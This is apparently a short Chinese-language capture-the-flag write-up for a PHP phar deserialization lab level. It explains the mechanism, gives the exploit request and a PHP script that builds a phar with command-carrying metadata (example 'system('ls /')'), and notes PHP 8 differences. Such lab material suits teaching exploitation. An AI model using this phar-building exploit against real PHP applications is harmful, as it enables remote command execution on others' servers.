# WriteUP · Level 23 · phar 反序列化

## 原理

phar 文件的 metadata 以序列化形式存储。任何文件函数
(`is_dir` / `file_exists` / `filesize` ...)以 `phar://` 流访问 phar 文件时,
metadata 会被**自动反序列化**——不需要 unserialize() 调用。

## EXP

```
?file=phar://helloctf.phar
```

`is_dir()` 触碰 phar 流 → metadata 中的 FLAG 对象被还原 →
脚本结束时 `__destruct` 执行 `helloctf_cmd`。

## 自制 phar

```php
// 本地:php -d phar.readonly=0 build_phar.php "system('ls /');"
class FLAG { public $helloctf_cmd; }
$phar = new Phar('helloctf.phar');
$phar->startBuffering();
$o = new FLAG(); $o->helloctf_cmd = $argv[1];
$phar->setMetadata($o);
$phar->addFromString('readme.txt', 'helloctf');
$phar->stopBuffering();
```


## PHP 8 行为差异

在 PHP 8.x 上实测(8.2):`file_exists` / `is_dir` / `filesize` 等文件函数触碰
`phar://` 流**不再触发** metadata 反序列化;即使显式 `new Phar(...)` 后调用
`getMetadata()`,metadata 对象可以还原,但其析构函数不会被调用。
因此本关的利用路径仅成立于 PHP 8 之前的版本(main 分支默认的 php:5.4 环境)。
